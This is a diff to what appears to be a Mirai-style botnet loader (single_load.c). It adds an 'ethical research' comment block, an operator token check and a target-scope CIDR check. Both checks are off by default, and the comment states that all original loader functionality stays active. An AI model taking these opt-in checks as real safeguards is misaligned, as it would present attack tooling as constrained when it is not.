@@ -27,6 +27,71 @@
 #define TOKEN_VERIFY    "applet not found"
 #define EXEC_VERIFY     "YESHELLO"
 
+/* ══════════════════════════════════════════════════════════════════════════════
+ * Ethical Research Enhancements for single_load.c
+ * ══════════════════════════════════════════════════════════════════════════════
+ *
+ * 1. OPERATOR AUTHORIZATION: Set LOADER_REQUIRE_AUTH=1 + LOADER_AUTH_TOKEN env
+ *    vars to require authorization before the loader will run.
+ *
+ * 2. TARGET SCOPE: Set AUTHORIZED_CIDR="10.0.0.0/8,192.168.0.0/16" to restrict
+ *    target IPs to authorized address space only. Targets outside the scope
+ *    are silently skipped and logged to stderr.
+ *
+ * All original functionality is preserved and active for authorized use.
+ * ══════════════════════════════════════════════════════════════════════════════
+ */
+
+/* ── Operator Authorization Check ─────────────────────────────────────────── */
+static int single_load_check_auth(void)
+{
+    const char *require = getenv("LOADER_REQUIRE_AUTH");
+    if (!require || strcmp(require, "1") != 0) return 1;
+    const char *expected = getenv("LOADER_AUTH_TOKEN");
+    const char *provided = getenv("LOADER_AUTH_PROVIDED");
+    if (!expected || !provided) {
+        fprintf(stderr, "[single_load] AUTHORIZATION REQUIRED: set LOADER_AUTH_TOKEN + LOADER_AUTH_PROVIDED\n");
+        return 0;
+    }
+    size_t elen = strlen(expected), plen = strlen(provided);
+    if (elen != plen) { fprintf(stderr, "[single_load] AUTH FAIL: token mismatch\n"); return 0; }
+    int diff = 0;
+    for (size_t i = 0; i < elen; i++) diff |= expected[i] ^ provided[i];
+    if (diff) { fprintf(stderr, "[single_load] AUTH FAIL: invalid token\n"); return 0; }
+    fprintf(stderr, "[single_load] AUTH OK\n");
+    return 1;
+}
+
+/* ── Target Scope Check ────────────────────────────────────────────────────── */
+static int single_load_ip_in_cidr(uint32_t ip_hbo, const char *cidr_str)
+{
+    char cidr[64];
+    strncpy(cidr, cidr_str, sizeof(cidr)-1); cidr[sizeof(cidr)-1] = '\0';
+    char *slash = strchr(cidr, '/');
+    if (!slash) return 0;
+    *slash = '\0';
+    int prefix = atoi(slash + 1);
+    if (prefix < 0 || prefix > 32) return 0;
+    uint32_t net = ntohl(inet_addr(cidr));
+    uint32_t mask = prefix == 0 ? 0 : (~0u << (32 - prefix));
+    return (ip_hbo & mask) == (net & mask);
+}
+
+static int single_load_check_scope(uint32_t ip_nbo)
+{
+    const char *authorized = getenv("AUTHORIZED_CIDR");
+    if (!authorized) return 1;
+    char buf[1024];
+    strncpy(buf, authorized, sizeof(buf)-1); buf[sizeof(buf)-1] = '\0';
+    char *tok = strtok(buf, ",");
+    while (tok) {
+        if (single_load_ip_in_cidr(ntohl(ip_nbo), tok)) return 1;
+        tok = strtok(NULL, ",");
+    }
+    return 0;
+}
+
+
 #define BYTES_PER_LINE      128
 #define CHARS_PER_BYTE      5
 #define MAX_SLICE_LENGTH    (BYTES_PER_LINE * CHARS_PER_BYTE)
